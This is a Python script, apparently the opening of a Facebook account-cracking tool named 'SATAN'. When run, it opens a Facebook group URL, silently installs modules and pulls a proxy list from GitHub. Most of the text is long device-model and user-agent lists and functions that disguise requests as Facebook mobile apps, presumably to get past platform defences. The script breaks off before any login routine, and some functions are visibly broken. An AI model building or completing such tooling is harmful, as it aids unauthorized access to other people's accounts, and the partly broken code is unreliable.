from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://web.facebook.com/groups/277547693132769/')
print('\n\033[1;37m install modules...\n It will take some seconds...')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python SATAN.py')
except:pass



#ADD PROSY LIST
try:
	proxy= requests.get('https://github.com/Luciferhck143/proxy/blob/main/proxy.txt').text
	open('.proxy.txt','w').write(proxy)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
prox=open('.proxy.txt','r').read().splitlines()

#FB LOGIN METHOD       
fbks=(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])

#PHONE MODLE
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])

sm = random.choice(['SM-G975F','SM-G970F','SM-N960F','SM-N975F','SM-G965F','SM-N970F','SM-G986B','SM-G975U','SM-G960F','SM-G988B','SM-A515F','SM-A715F','SM-G988U','SM-A505F','SM-N986B','SM-N950F','SM-A207F','SM-A107F','SM-G977B','SM-A217F','SM-A205F','SM-G781B','SM-G960U','SM-G985F','SM-G986U','SM-G980F','SM-A515U','SM-G977U','SM-G973F','SM-A307F','SM-A107M','SM-A217U','SM-G977V','SM-A125F','SM-G988N','SM-N975U','SM-A716B','SM-G981U','SM-G986N','SM-A505U','SM-A705F','SM-G977P','SM-A207M','SM-A115M','SM-N986U','SM-A205U','SM-A102U','SM-A715U','SM-A217M','SM-G986W','SM-G981B','SM-A015M','SM-A515W','SM-G781U','SM-A307GT','SM-N975W','SM-G980U','SM-A207U','SM-A115U','SM-G977W','SM-A125U','SM-A705W','SM-A102W','SM-A716U','SM-G981V','SM-A013M','SM-A515N','SM-A217N','SM-A515U1','SM-G780F','SM-A307FN','SM-G988W','SM-N986N','SM-A015U','SM-A115W','SM-G988U1','SM-A125N','SM-A205W','SM-A705M','SM-A102N','SM-A515GN','SM-A716W','SM-G981W','SM-A013F','SM-A515F/DS','SM-A217F/DS','SM-N975N','SM-A307G','SM-G977T','SM-A515N/DS','SM-G981U1','SM-A102F','SM-A716U1','SM-A505G','SM-A115F','SM-G9880','SM-A217N/DS','SM-A015F','SM-A715F/DS','SM-A515W/DS','SM-G975FC'])


#SSB USERAGENT METHOD
def randBuildvsskj():
    END =  '[FBAN/Orca-Android;FBAV/119.0.0.18.91;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/58970668;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBDV/SM-G935F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    satan = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-14-2-3)","Dalvik/2.1.0 (Linux; U; Android 9; Tanix H1 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 9; strongbad Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 11; moto e30 Build/ROP31.166-87)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOWS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 fusion Build/S2RKS32.92-11-30-10)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; M3 pro Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; PGBM10 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2219 Build/TP1A.220905.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 13; 2109119DG Build/TKQ1.220829.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; RMX3371 Build/TP1A.220905.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020) VD/236","Dalvik/2.1.0 (Linux; U; Android 9; V1916A Build/PKQ1.190714.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-P610 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A605K Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; 2201117SY Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; MI 6 Build/PKQ1.190118.001)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT5760D Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-10-8)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; PBSKD7001 Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; T104_64GB Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2169 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; G50 Mega 2022 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; LM-K410 Build/RKQ1.210420.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 9; itel L6501 Build/PPR1.180610.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; LM-X525 Build/QKQ1.200531.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; AX810 Build/RT)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOVS32.121-25-2)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6296)","Dalvik/2.1.0 (Linux; U; Android 10; SH-02M Build/SA053)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOVS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A325F Build/RP1A.200720.012) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; moto e40 Build/ROQ31.166-87)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G Build/QPNS30.37-Q3-42-32-4-3)","Dalvik/2.1.0 (Linux; U; Android 5.1; I-S6 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 5.0; Mix Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 12; moto g71 5G Build/S2RUBS32.51-15-3-10)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11; land_rover_ks1920x720 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; M40 Pro_ROW Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ52 Build/61.2.A.0.439)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; MiTV4-ANSM0 Build/MHC19J)","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3LVG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; SM-G965F Build/QP1A.190711.020) VD/236","Dalvik/2.1.0 (Linux; U; Android 12; SM-G973F Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 7A MIUI/V12.5.3.0.QCMEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; 8091_EEA Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; MXQ PRO Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32(s) Build/STB32.36-91)","Dalvik/2.1.0 (Linux; U; Android 9; LAVA LH9931 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; Elite N55Max Build/T00624)","Dalvik/2.1.0 (Linux; U; Android 11; HiSmart 2K ATV4 Build/RTO6.230411.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2253 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-28)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TP1A.220624.021)","Dalvik/2.1.0 (Linux; U; Android 13; SOG06 Build/64.1.D.0.120)","Dalvik/2.1.0 (Linux; U; Android 11; MATE 9 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one hyper Build/QPFS30.103-43-9)","Dalvik/2.1.0 (Linux; U; Android 13; 23049RAD8C Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 9; moto e6 play Build/POAS29.550-132-25) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; SM-A307GN Build/RP1A.200720.012) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-82-5)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M19 Build/S3020)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SE1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.B1)","Dalvik/2.1.0 (Linux; U; Android 6.0; LGLS991 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.0; AS-503 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; TX6 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2389 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 10; K1 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; A103ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11.1; Q96MAX Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 12; SM-N976Q Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS-TVX19A Build/PTM5.200218.935)","Dalvik/2.1.0 (Linux; U; Android 9; B UHD Android TV Build/PTO2.220426.001)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G970N Build/PQ3A.190605.05171606)","Dalvik/2.1.0 (Linux; U; Android 10; Deco 4K con Android TV Build/QTG1.221129.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CC54 Build/65.1.A.5.50)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; A95XF3Air Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005D Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android UpsideDownCake Build/UPB2.230407.019)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.447)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BT52 Build/62.2.A.0.481)","Dalvik/2.1.0 (Linux; U; Android 9; Dell Chromebook 11 (3180) Build/R103-14816.131.0)","Dalvik/2.1.0 (Linux; U; Android 5.1; JALA.V158F3P.E6 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-20)","Dalvik/2.1.0 (Linux; U; Android 9; AT_SmartScreen Build/RTK2851P)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2021) Build/S1RMS32.68-43-16-9)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; ASUS_Z011D Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; 100071483 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 9296Q Build/RKQ1.210107.001)","Dalvik/2.1.0 (Linux; U; Android 9; T10LTE Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; YMP-A1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12.0; uis8581a2h10_Automotive Build/QP1A.190711.020)"])+END
    return satan

def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ssb = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-14-2-3)","Dalvik/2.1.0 (Linux; U; Android 9; Tanix H1 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 9; strongbad Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 11; moto e30 Build/ROP31.166-87)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOWS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 fusion Build/S2RKS32.92-11-30-10)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; M3 pro Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; PGBM10 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2219 Build/TP1A.220905.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 13; 2109119DG Build/TKQ1.220829.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; RMX3371 Build/TP1A.220905.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020) VD/236","Dalvik/2.1.0 (Linux; U; Android 9; V1916A Build/PKQ1.190714.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-P610 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A605K Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; 2201117SY Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; MI 6 Build/PKQ1.190118.001)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT5760D Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-10-8)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; PBSKD7001 Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; T104_64GB Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2169 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; G50 Mega 2022 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; LM-K410 Build/RKQ1.210420.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 9; itel L6501 Build/PPR1.180610.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; LM-X525 Build/QKQ1.200531.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; AX810 Build/RT)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOVS32.121-25-2)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6296)","Dalvik/2.1.0 (Linux; U; Android 10; SH-02M Build/SA053)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOVS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A325F Build/RP1A.200720.012) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; moto e40 Build/ROQ31.166-87)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G Build/QPNS30.37-Q3-42-32-4-3)","Dalvik/2.1.0 (Linux; U; Android 5.1; I-S6 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 5.0; Mix Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 12; moto g71 5G Build/S2RUBS32.51-15-3-10)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11; land_rover_ks1920x720 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; M40 Pro_ROW Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ52 Build/61.2.A.0.439)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; MiTV4-ANSM0 Build/MHC19J)","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3LVG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; SM-G965F Build/QP1A.190711.020) VD/236","Dalvik/2.1.0 (Linux; U; Android 12; SM-G973F Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 7A MIUI/V12.5.3.0.QCMEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; 8091_EEA Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; MXQ PRO Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32(s) Build/STB32.36-91)","Dalvik/2.1.0 (Linux; U; Android 9; LAVA LH9931 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; Elite N55Max Build/T00624)","Dalvik/2.1.0 (Linux; U; Android 11; HiSmart 2K ATV4 Build/RTO6.230411.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2253 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-28)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TP1A.220624.021)","Dalvik/2.1.0 (Linux; U; Android 13; SOG06 Build/64.1.D.0.120)","Dalvik/2.1.0 (Linux; U; Android 11; MATE 9 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one hyper Build/QPFS30.103-43-9)","Dalvik/2.1.0 (Linux; U; Android 13; 23049RAD8C Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 9; moto e6 play Build/POAS29.550-132-25) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; SM-A307GN Build/RP1A.200720.012) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-82-5)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M19 Build/S3020)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SE1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.B1)","Dalvik/2.1.0 (Linux; U; Android 6.0; LGLS991 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.0; AS-503 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; TX6 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2389 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 10; K1 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; A103ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11.1; Q96MAX Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 12; SM-N976Q Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS-TVX19A Build/PTM5.200218.935)","Dalvik/2.1.0 (Linux; U; Android 9; B UHD Android TV Build/PTO2.220426.001)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G970N Build/PQ3A.190605.05171606)","Dalvik/2.1.0 (Linux; U; Android 10; Deco 4K con Android TV Build/QTG1.221129.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CC54 Build/65.1.A.5.50)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; A95XF3Air Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005D Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android UpsideDownCake Build/UPB2.230407.019)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.447)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BT52 Build/62.2.A.0.481)","Dalvik/2.1.0 (Linux; U; Android 9; Dell Chromebook 11 (3180) Build/R103-14816.131.0)","Dalvik/2.1.0 (Linux; U; Android 5.1; JALA.V158F3P.E6 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-20)","Dalvik/2.1.0 (Linux; U; Android 9; AT_SmartScreen Build/RTK2851P)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2021) Build/S1RMS32.68-43-16-9)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; ASUS_Z011D Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; 100071483 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 9296Q Build/RKQ1.210107.001)","Dalvik/2.1.0 (Linux; U; Android 9; T10LTE Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; YMP-A1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12.0; uis8581a2h10_Automotive Build/QP1A.190711.020)"])+END
    return ssb

#SATAN USERAGENT METHOD
def satn_ua():
  for i in range(100):
    version_ = str(random.randint(4, 14)) + "." + str(random.randint(0, 4)) + "." + str(random.randint(0, 4))
    model_ = "SM-" + str(random.randint(100, 999))
    brand_name_ = random.choice(["Samsung"])
    width_ = random.randint(320, 1080)
    height_ = random.randint(480, 1920)
    user_agent = (['Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/400.0.0.37.76 ;FBPN/com.facebook.katana;FBLC/en_US;FBBV/421011115;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(width_)+',height='+str(height_)+'}'])

# AQIB USERAGENT METHOD
def iAmAndroidUa():
    # YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong','Ufone','Telernor'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
